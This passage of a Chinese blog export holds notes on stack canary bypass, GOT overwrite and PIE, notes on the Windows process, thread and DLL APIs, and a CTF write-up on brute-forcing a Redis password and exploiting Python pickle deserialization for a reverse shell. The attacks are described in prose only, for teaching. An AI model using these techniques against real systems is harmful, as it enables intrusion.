alt="canary_gdb"><br>从图中我们可以发现两个问题</p><ol><li>按照wiki的图示64位上canary在rbp-8的位置上，那么在32位应该在ebp-4的位置上啊，其实不然，我们一定要亲手去调试，去观察，才能发现问题，不能凭空猜想</li><li>canary的末尾都是00，对正因为我们在图里看见是末尾为00，才能防止它被不小心读出来，这特意设计的。</li></ol></blockquote><blockquote><p>那么我们怎么突破这个canary的保护机制呢？</p></blockquote><blockquote><p>实际在栈溢出阶段很简单，只需要先溢出覆盖canary的最后两个00使其不被截断，在通过输出函数来打印出来，我们就能成功泄露canary，注意第一次用来泄露canary的payload我们应该以程序起始地址来结束，这样可以跳到程序最开始的地方，一是可以刷新栈空间，二是可以再次触发漏洞来写入新的paylaod，这一点很重要，我们泄露canary的目的就是为了第二次触发溢出去修改返回地址时在把canary放回他应原地，放在程序直接退出，这个才是我们主要目的，其实到后期还有几种可以突破canary的姿势，但是我们需要一些关于堆的姿势，这个我后期做总结时会写，有兴趣的可以查看<a href="https://wiki.x10sec.org/pwn/mitigation/Canary/" target="_blank" rel="noopener">CTF-Wiki-Canary</a></p></blockquote><h5 id="RelRO"><a href="#RelRO" class="headerlink" title="RelRO"></a>RelRO</h5><blockquote><p>这个保护机制主要目的就是降低可写区域，但网上查到说只有全开才能缓解覆盖GOT表攻击（其实不一定，能不能覆盖GOT表，还是得需要看GOT表有没有可写权限）。</p></blockquote><blockquote><p>这里可以顺便说一下覆盖GOT表攻击，其实这个比较简单，但我们得先了解动态链接库与延迟绑定技术的原理。</p></blockquote><blockquote><p><code>动态链接库也称为动态共享库</code>，是为了静态库的缺陷，静态库就相当于直接把库函数的源码与程序的源码编译到一起，每次更新程序，部署程序都需要重新编译一整套源码，为了解决这个问题，提出了动态共享库的概念，意思就是把一些公共函数，或者可以从源码中提取的模块化的内容，放到一边，单独编译，主程序需要用时，在载入程序。</p></blockquote><blockquote><p><code>延迟绑定技术</code>，是为了弥补使用动态链接库时程序性能的缺陷，因为在使用动态链接库时，每次程序调用库里面的函数，都需要通过GOT表进行重定位，这样会减弱程序的性能，所以提出了延迟绑定的概念，简单来说就是当程序第一次使用到的函数才进行重定位后绑定。大致流程如图所示：<br><img src="./img/lazy_binding.png" alt="laze_binding"></p></blockquote><blockquote><p>从图中我们也可以出实际上重定位与绑定函数通过GOT表交给了<code>_dl_runtime_resolve</code>这个函数，这里实际上又有一种攻击手段可以同时绕过NX与PIE</p></blockquote><h5 id="PIE"><a href="#PIE" class="headerlink" title="PIE"></a>PIE</h5><blockquote><p>全称为空间地址随机化，这个其实没多少解释的，就是地址随机化，但注意，Wiki上说也仅仅只是针对中间部分的地址随机化，在我们泄露libc时，完全可以只需要泄露后面12位来查询libc</p></blockquote><hr><h3 id="关于文件结构"><a href="#关于文件结构" class="headerlink" title="关于文件结构"></a>关于文件结构</h3><blockquote><p>啊 写道这里快写不下去了 感觉内容太多 不是一次能讲得完的<br>后面更新链接补在上面</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 总结 </tag>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows进程控制</title>
      <link href="/2019/07/11/Windows%E8%BF%9B%E7%A8%8B%E6%8E%A7%E5%88%B6/"/>
      <url>/2019/07/11/Windows%E8%BF%9B%E7%A8%8B%E6%8E%A7%E5%88%B6/</url>
      
        <content type="html"><![CDATA[<h1 id="Windows进程控制"><a href="#Windows进程控制" class="headerlink" title="Windows进程控制"></a>Windows进程控制</h1><h2 id="程序入口"><a href="#程序入口" class="headerlink" title="程序入口"></a>程序入口</h2><blockquote><p><img src="%E7%A8%8B%E5%BA%8F%E5%85%A5%E5%8F%A3.png" alt="程序入口"></p></blockquote><h2 id="获取系统版本信息"><a href="#获取系统版本信息" class="headerlink" title="获取系统版本信息"></a>获取系统版本信息</h2><pre><code class="c++">OSVERSIONINFO vs = {sizeof(vs)};GetVersionEx(&amp;vs);DWORD dwBaseAddr;if(vs.dwPlatformld==VER_PLATFORM_WIN32_WINDOWS){    prinrf(&quot;This is Windows 98...\n&quot;);    dwBaseAddr = 4 * KONEK * KONEK;}else if(vs.dwPlatformld==VER_PLATFORM_WIN32_NT){    printf(&quot;This is windows NT...\n&quot;)    dwBaseAddr = 64 * KONEK;}</code></pre><h2 id="创建进程："><a href="#创建进程：" class="headerlink" title="创建进程："></a>创建进程：</h2><p><img src="%E5%88%9B%E5%BB%BA%E8%BF%9B%E7%A8%8B.png" alt="创建进程"></p><pre><code class="c++">BOOL CreateProcessA(  LPCSTR                lpApplicationName,      //对象名称  LPSTR                 lpCommandLine,          //命令行  LPSECURITY_ATTRIBUTES lpProcessAttributes,    //需要继承的句柄  LPSECURITY_ATTRIBUTES lpThreadAttributes,     //需要继承的线程句柄  BOOL                  bInheritHandles,        //是否继承句柄  DWORD                 dwCreationFlags,        //创建标志  LPVOID                lpEnvironment,          //使用父进程环境变量  LPCSTR                lpCurrentDirectory,     //使用父进程目录作为当前目录, 可以自行设置  LPSTARTUPINFOA        lpStartupInfo,          //STARTUPINFOW结构体 详细信息  LPPROCESS_INFORMATION lpProcessInformation    //PROCESSINFORMATION结构体 进程信息);</code></pre><h2 id="进程控制："><a href="#进程控制：" class="headerlink" title="进程控制："></a>进程控制：</h2><p><img src="%E8%BF%9B%E7%A8%8B%E6%8E%A7%E5%88%B6.png" alt="进程控制"></p><h3 id="遍历进程："><a href="#遍历进程：" class="headerlink" title="遍历进程："></a>遍历进程：</h3><pre><code class="c++">//创建系统进程快照HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);//获取其余进程信息while(bMore){    printf(&quot;进程ID: %d\n&quot;, pc.th32ProcessID);    printf(&quot;进程名称: %s\n&quot;, pc.szExeFile);    bMore = Process32Next(hProcessSnap, &amp;pc);}//关闭系统快照CloseHandle(hProcessSnap);</code></pre><h3 id="打开进程"><a href="#打开进程" class="headerlink" title="打开进程"></a>打开进程</h3><blockquote><ul><li>对于已经存在的进程需要通过OpenProcess函数打开进程并获取该进程的句柄</li></ul></blockquote><pre><code class="c++">HANDLE OpenProcess(    //获取权限, PROCESS_ALL_ACCESS    DWORD dwDesiredAccess,    BOOL bInheritHandle, //指定句柄是否可以继承    DWORD dwProcessld // 进程的ID)</code></pre><h3 id="终止进程"><a href="#终止进程" class="headerlink" title="终止进程:"></a>终止进程:</h3><blockquote><ul><li>进程中的一个线程调用了ExitProcess() //自杀</li><li>其他进程中的一个线程调用了TerminateProcess // 它杀</li></ul></blockquote><blockquote><p>他杀:</p></blockquote><pre><code class="c++">//打开进程，获取句柄HANDLE hHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwld);if(hHandle != NULL){    //终止进程    TerminateProcess(hHandle, 0);}//关闭句柄CloseHandle(hHandle);</code></pre><h2 id="模块目录与工作目录API"><a href="#模块目录与工作目录API" class="headerlink" title="模块目录与工作目录API"></a>模块目录与工作目录API</h2><pre><code class="c++">GetModuleFileName(NULL, strModule, 256) //模块目录GetCurrentDirectory(1000, buf) //工作目录</code></pre><h2 id="其他进程相关API"><a href="#其他进程相关API" class="headerlink" title="其他进程相关API:"></a>其他进程相关API:</h2><pre><code class="c++">//获取进程PIDGETCurrentProcessid//获取进程句柄GetCurrentProcess//获取命令行GetCommandLine//获取启动信息GetStartupInfo//遍历进程PIDEnumProcesses//快照CreateToolhelp32Snapshot</code></pre><h2 id="其他相关API"><a href="#其他相关API" class="headerlink" title="其他相关API"></a>其他相关API</h2><pre><code class="c++">GetNativeSystemInfo(SYSTEM_INFO systemInfo);GetSystemInfo();</code></pre><blockquote><p>示例:</p></blockquote><pre><code class="c++">int main(void){    SYSTEM_INFO systemInfo;    GetNativeSystemInfo(&amp;systemInfo);    std::cout &lt;&lt; &quot;处理器个数: &quot; &lt;&lt; systemInfo.dwNumberOfProcessors &lt;&lt; std::endl        &lt;&lt; &quot;分配粒度: &quot; &lt;&lt; systemInfo.dwAllocationGranularity &lt;&lt; std::endl        &lt;&lt; &quot;分页大小: &quot; &lt;&lt; systemInfo.dwPageSize &lt;&lt; std::endl        &lt;&lt; &quot;最小寻址单元: &quot; &lt;&lt; systemInfo.lpMinimumApplicationAddress &lt;&lt; std::endl        &lt;&lt; &quot;最大寻址单元: &quot; &lt;&lt; systemInfo.lpMaximumApplicationAddress &lt;&lt; std::endl;    std::cout &lt;&lt; &quot;--&quot; &lt;&lt; systemInfo.wProcessorArchitecture &lt;&lt; &quot;--&quot; &lt;&lt; std::endl;    if (systemInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 || systemInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_ALPHA64)    {        std::cout &lt;&lt; &quot;该操作系统是64位&quot; &lt;&lt; std::endl;    }    else    {        std::cout &lt;&lt; &quot;该操作系统是32位&quot; &lt;&lt; std::endl;    }    system(&quot;pause&quot;);    return 0;}</code></pre>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编程 </tag>
            
            <tag> Windows </tag>
            
            <tag> C/C++ </tag>
            
            <tag> Win32 </tag>
            
            <tag> 进程对象 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows线程控制</title>
      <link href="/2019/07/10/Windows%E7%BA%BF%E7%A8%8B%E6%8E%A7%E5%88%B6/"/>
      <url>/2019/07/10/Windows%E7%BA%BF%E7%A8%8B%E6%8E%A7%E5%88%B6/</url>
      
        <content type="html"><![CDATA[<h1 id="Windows线程"><a href="#Windows线程" class="headerlink" title="Windows线程"></a>Windows线程</h1><pre><code class="c++">HANDLE CreateThread（LPSECURITY_ATTRIBUTES lpThreadAttributes,    //指向线程安全属性的指针DWORD dwStackSize,    //初始线程堆栈大小，以字节为单位LPTHREAD_START_ROUTINE lpStartAddress,    //指向线程函数的指针LPVOID lpParameter,    //新线程 参数DWORD dwCreationFlags,    //创建标志LPDWORD lpThreadId    //指向返回的线程标识符);</code></pre><h2 id="一段创建线程的函数"><a href="#一段创建线程的函数" class="headerlink" title="一段创建线程的函数"></a>一段创建线程的函数</h2><blockquote></blockquote><pre><code class="c++">#include &lt;iostream&gt;#include &lt;Windows.h&gt;DWORD WINAPI ThreadFunc(LPVOID lpParam){    //TODO: code;    for (int i = 0; i &lt; 5; i++)    {        printf_s(&quot;+++++++%d\n&quot;, i);    }    return 0;}int main(){    HANDLE NewThreadHandle;    NewThreadHandle = CreateThread(NULL, NULL, ThreadFunc, NULL, NULL, NULL);    if (NewThreadHandle != NULL)    {        CloseHandle(NewThreadHandle);    }    for (int i = 0; i &lt; 5; i++)    {        printf_s(&quot;--------%d\n&quot;, i);    }    return 0;}</code></pre><blockquote><p>某次输出结果:</p></blockquote><pre><code class="shell">--------0--------1--------2--------3--------4+++++++0+++++++1+++++++2+++++++3+++++++4</code></pre><h2 id="线程控制相关API"><a href="#线程控制相关API" class="headerlink" title="线程控制相关API:"></a>线程控制相关API:</h2><pre><code class="c++">//让自己停下来    Sleep()//让别人停下来    SuspendThread()//线程回复    ResumeThread()//等待线程线程结束    1. WaitForSingleObject(        HANDLE hThread,         dwMilliseconds INFINITE        )    2. WaitForMultipleObjects(        DWORD nCount,        CONST HANDLE *lpHandles,        BOOL bWaitAll,        DWORD dwMilliseconds    )    3. GetExitCodeThread()</code></pre><h3 id="线程上下文"><a href="#线程上下文" class="headerlink" title="线程上下文"></a>线程上下文</h3><blockquote><p>CONTEXT context;<br>先挂住线程: SuspendThread();<br>context.ContextFlags = CONTEXT_INTEGER; //获取那段取哪段</p></blockquote><blockquote><p>相关API</p></blockquote><pre><code class="c++">BOOL GetThreadContext(    HANDLE hThread,    LPCONTEXT lpContext)BOOL SetThreadContext(    HANDLE hThread,    CONST CONTEXT *lpContext)</code></pre><h2 id="线程安全"><a href="#线程安全" class="headerlink" title="线程安全"></a>线程安全</h2><h3 id="普通临界资源"><a href="#普通临界资源" class="headerlink" title="普通临界资源"></a>普通临界资源</h3><p><img src="./%E4%B8%B4%E7%95%8C%E5%8C%BA-%E4%BB%A4%E7%89%8C.png" alt="临界区-令牌.png"></p><pre><code class="c++">//创建全局变量    CRITICAL_SECTION cs;//初始化全局变量    InitializeCriticalSection(&amp;cs);//实现临界区    EnterCriticalSection(&amp;cs);    LeaveCriticalSection(&amp;cs);</code></pre><h3 id="内核级临界资源"><a href="#内核级临界资源" class="headerlink" title="内核级临界资源"></a>内核级临界资源</h3><p><img src="./%E5%86%85%E6%A0%B8%E4%BA%92%E6%96%A5%E4%BD%93.png" alt="内核互斥体"></p><blockquote><p>相关API</p></blockquote><pre><code class="c++">//创建互斥体HANDLE CreateMutex(    LPSECURITY_ATTRIBUTES lpMutexATTributes,    BOOL bInitialOwner,    LPCTSTR lpName)//获取令牌WaitForSingleObject(    HANDLE g_hMutex,    INFINITE)//释放令牌ReleaseMutex(HANDLE g_hMutex)//获取错误信息//可以防止多开DWORD dwRet = GetLastError()if(ERROR_ALREADY_EXISTS == dwRet){    CloseHandle(hMutex);    return 0;}</code></pre><h2 id="通知类型-事件-内核对象"><a href="#通知类型-事件-内核对象" class="headerlink" title="通知类型-事件(内核对象)"></a>通知类型-事件(内核对象)</h2><pre><code class="c++">//创建EventHANDLE CreateEvent(    LPSECURITY_ATTRIBUTES lpEventAttributes,    BOOL bManualReset,    BOOL bInitialState,    LPCTSTR lpName)</code></pre><h3 id="线程同步"><a href="#线程同步" class="headerlink" title="线程同步"></a>线程同步</h3><blockquote><p>线程互斥: 线程互斥是指对于共享的进程系统资源, 在各单位线程访问时的<code>排他性</code>。当有若干个线程都要使用某一个共享资源时, <code>任何时刻最多只允许一个线程去执行使用</code>, 其他要使用该资源的线程必须等待, 直到占有资源者释放该资源。</p></blockquote><blockquote><p>线程同步: 线程同步是指线程之间所具有的一种<code>制约关系</code>, 一个线程的执行依赖另一个线程的消息, 当它没有得到另一个线程的消息时应等待, 直到消息到达时才被唤醒。</p></blockquote><blockquote><p>同步的前提是互斥<br>同步 = 互斥 + 有序</p></blockquote><h4 id="生产者消费者模型"><a href="#生产者消费者模型" class="headerlink" title="生产者消费者模型:"></a>生产者消费者模型:</h4><pre><code class="c++">//生产者线程函数DWORD WINAPI ThreadProduct(LPVOID pM){    for(int i=0; i&lt;g_Max; i++)    {        WaitForSingleObject(g_hSet, INFINITE);        g_Number = 1;        DWORD id = GetCurrentThreadId();        printf(&quot;生产者%d将数据%d放入缓冲区\n&quot;, id, g_Number);        SetEvent(g_hClear);    }    return 0 ;}//消费者线程函数DWORD WINAPI ThreadConsumber(LPVOID pm){    for(int i=0; i&lt;g_Max; i++)    {        WaitForSingleObject(g_hClear, INFINITE);        g_Number = 1;        DWORD id = GetCurrentThreadId();        printf(&quot;消费者%d将数据%d放入缓冲区\n&quot;, id, g_Number);        SetEvent(g_hSet);    }    return 0 ;}//主函数int main(int argc, const char* argv[]){    HANDLE hThreads[2];    g_hSet = CreateEvent(NULL, FALSE, TRUE, NULL);    g_hClear = CreateEvent(NULL, FALSE, FALSE, NULL);    hThread[0] = ::CreateThread(NULL, NULL, ThreadProduct, NULL, NULL, NULL);    hThread[1] = ::CreateThread(NULL, NULL, ThreadProduct, NULL, NULL, NULL);    WaitForMultipleObjects(2, hThreads, TRUE, INFINITE);    CloseHandle(hThread[0]);    CloseHandle(hThread[1]);    return 0;}</code></pre>]]></content>
      
      
      <categories>
          
          <category> 分类1 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编程 </tag>
            
            <tag> Windows </tag>
            
            <tag> C/C++ </tag>
            
            <tag> Win32 </tag>
            
            <tag> 线程对象 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C/C++动态链接库</title>
      <link href="/2019/07/08/C-C-%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93/"/>
      <url>/2019/07/08/C-C-%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93/</url>
      
        <content type="html"><![CDATA[<h1 id="windows下C-C-动态链接库"><a href="#windows下C-C-动态链接库" class="headerlink" title="windows下C/C++动态链接库"></a>windows下C/C++动态链接库</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言:"></a>前言:</h2><blockquote><p>C/C++动态链接库笔记</p></blockquote><h2 id="动态链接库创建和使用"><a href="#动态链接库创建和使用" class="headerlink" title="动态链接库创建和使用"></a>动态链接库创建和使用</h2><h3 id="创建动态链接库"><a href="#创建动态链接库" class="headerlink" title="创建动态链接库"></a>创建动态链接库</h3><pre><code class="c++">extern&quot;C&quot; _declspec(dllexport) __stdcall int funcname (parmlist);</code></pre><blockquote><p>在cpp里面正常实现函数</p></blockquote><h4 id="关于调用约定"><a href="#关于调用约定" class="headerlink" title="关于调用约定:"></a>关于调用约定:</h4><table><thead><tr><th align="center">调用约定</th><th align="center">堆栈清除</th><th align="center">参数传递</th></tr></thead><tbody><tr><td align="center">__cdecl</td><td align="center">调用者</td><td align="center">从右到左, 通过堆栈传递</td></tr><tr><td align="center">__stdcall</td><td align="center">函数体</td><td align="center">从右到左,通过堆栈传递</td></tr><tr><td align="center">__fastcall</td><td align="center">函数体</td><td align="center">从右到左,优先使用寄存器(ECX,EDX),然后使用堆栈</td></tr><tr><td align="center">thiscall</td><td align="center">函数体</td><td align="center">this指针默认通过ECX传递,其它参数从右到左入栈</td></tr></tbody></table><blockquote><p>使用.def,如:</p></blockquote><pre><code class="c++">EXPORTSfuncname @numberfuncname @number NONAME</code></pre><hr><h2 id="使用动态链接库"><a href="#使用动态链接库" class="headerlink" title="使用动态链接库"></a>使用动态链接库</h2><h3 id="显示调用"><a href="#显示调用" class="headerlink" title="显示调用"></a>显示调用</h3><blockquote><p>定义函数指针:</p></blockquote><pre><code class="c++">typedef int (__stdcall *lpPlus)(int, int);typedef int (__stdcall *lpSub)(int, int);</code></pre><blockquote><p>生命函数指针变量:</p></blockquote><pre><code class="c++">lpPlus myPlus;lpPlus myPlus;</code></pre><blockquote><p>动态加载dll到内存:</p></blockquote><pre><code class="c++">HINSTANCE hModule = LoadLibrary(&quot;DllDome.dll&quot;);</code></pre><blockquote><p>获取函数地址:</p></blockquote><pre><code class="c++">myPlus = (lpPlus)GetProcAddress(hModule, &quot;Plus&quot;);mySub = (lpSub)GetProcAddress(hModule, (cahr*)0x0D);</code></pre><blockquote><p>调用函数:</p></blockquote><pre><code class="c++">int a = myPlus(10, 2);int b = mySub(10, 2);</code></pre><blockquote><p>释放动态链接库:</p></blockquote><pre><code class="c++">FreeLibrary(hModule);</code></pre><hr><h3 id="隐式调用"><a href="#隐式调用" class="headerlink" title="隐式调用"></a>隐式调用</h3><blockquote><ul><li>将 *.dll *.lib 放到工程目录下面</li><li>引入头文件</li><li>cpp文件中加入:<code>#pragma comment(lib,&quot;DLLName.lib&quot;)</code></li></ul></blockquote><hr><h3 id="DLL生存周期"><a href="#DLL生存周期" class="headerlink" title="DLL生存周期:"></a>DLL生存周期:</h3><pre><code class="c++">// dllmain.cpp : 定义 DLL 应用程序的入口点。#include &quot;framework.h&quot;BOOL APIENTRY DllMain( HMODULE hModule,                       DWORD  ul_reason_for_call,                       LPVOID lpReserved                     ){    switch (ul_reason_for_call)    {    case DLL_PROCESS_ATTACH:        //被进程调用:        MessageBox(NULL, L&quot;I was attached by PROCESS&quot;, L&quot;DLL生命周期提示框&quot;, MB_OK);        break;    case DLL_THREAD_ATTACH:        //被线程调用:        MessageBox(NULL, L&quot;I was attached by THREAD&quot;, L&quot;DLL生命周期提示框&quot;, MB_OK);        break;    case DLL_THREAD_DETACH:        //被线程释放        MessageBox(NULL, L&quot;I was detached by PROCESS&quot;, L&quot;DLL生命周期提示框&quot;, MB_OK);        break;    case DLL_PROCESS_DETACH:        //被线程释放        MessageBox(NULL, L&quot;I was detached by PROCESS&quot;, L&quot;DLL生命周期提示框&quot;, MB_OK);        break;    }    return TRUE;}</code></pre>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> c/c++ </tag>
            
            <tag> 动态链接库 </tag>
            
            <tag> DLL </tag>
            
            <tag> WIN32API </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>FLAG-领取系统</title>
      <link href="/2019/07/08/FLAG-%E9%A2%86%E5%8F%96%E7%B3%BB%E7%BB%9F/"/>
      <url>/2019/07/08/FLAG-%E9%A2%86%E5%8F%96%E7%B3%BB%E7%BB%9F/</url>
      
        <content type="html"><![CDATA[<h1 id="FLAG-领取系统"><a href="#FLAG-领取系统" class="headerlink" title="FLAG-领取系统"></a>FLAG-领取系统</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言:"></a>前言:</h2><blockquote><p>前段时间，看见几篇帖子，分别提到一个redis数据库未授权访问，和一个pickle反序列化漏洞，这个两个问题在生产环境很常见，redis当作高速缓存来存放cookie时，序列化字符串存为cookie对于的value可以来保存用户现场，开发人员一直认为数据库在本地，从而数据源可信，因此不做过滤，So,攻击者的突破口便在redis数据库，拿下数据库后，便可以写入exploit,从而引发反序列化漏洞，getshell。</p></blockquote><hr><h2 id="题目考点"><a href="#题目考点" class="headerlink" title="题目考点"></a>题目考点</h2><blockquote><ul><li>收集信息：资料查询，nmap（端口及服务）</li><li>Metasploit-framework 模块攻击redis 弱口令 预计正常拿到密码只需要5秒 </li><li>基于python3-pickle模块的反序列化漏洞利用，及EXP编写</li><li>nc 接收反弹shell操作</li></ul></blockquote><hr><h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路:"></a>解题思路:</h2><blockquote><p>Tips: 题目提示<br>1、信息收集基本功<br>2、msf会用吗？pickle熟悉吗？<br>3、啥？你说你不会接收shell，那你装nc有啥用</p></blockquote><blockquote><p><img src="./start.png" alt="start"></p></blockquote><blockquote><ul><li>题目上有cookie，且基于高速缓存保存用现场，则百度,谷哥 查询关键字以及深度挖掘数据后得到 redis数据库可以作为web开发中的高速缓存来使用，且redis很多时候存在未授权访问，同时密码验证速度极快。<img src="./nmap.png" alt="namp">)<img src="./info_collect.png" alt="信息收集"></li></ul></blockquote><blockquote><ul><li>尝试使用MSF来攻击，之后拿到redis数据库的密码，以及登录权限。<img src="./attack_1.png" alt="attack_1"></li></ul></blockquote><blockquote><ul><li>继续尝试msf中的redis文件上传攻击模块，发现redis被降权无法写入文件。</li></ul></blockquote><blockquote><ul><li>登录redis后发现key值为cookie,value值很想序列化后的数据流，抓包过程中发现服务器使用的python3编写。</li><li>继续信息收集步骤，后发现python3，pickle模块可用于保存用户现场，但是可能存在反序列化漏洞，导致任意代码读写楼，可以本地构造poc。<br><img src="./attack_2.png" alt="attack_2"></li></ul></blockquote><blockquote><ul><li>整合思路：先注册账号，使得数据库中存在对于key为cookie，构造exp向redis中key=cookie的value值为exploit,然后打开nc监听指定端口 利用改cookie登录引发反序列化漏洞，反弹shell，cat flag。<br><img src="./attack_3.png" alt="attack_3"></li></ul></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WEB </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
